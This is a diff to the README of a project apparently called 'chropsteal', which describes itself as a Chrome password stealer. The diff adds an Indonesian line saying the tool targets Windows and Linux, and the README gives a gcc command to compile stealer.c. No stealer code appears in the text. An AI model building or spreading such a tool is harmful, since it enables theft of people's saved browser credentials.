@@ -1,6 +1,8 @@
 # chropsteal
 Chrome Password Stealer
 
+Khusus target Windows dan Linux
+
 Untuk penggunaan
 ```
 gcc.exe stealer.c -o stealer.exe
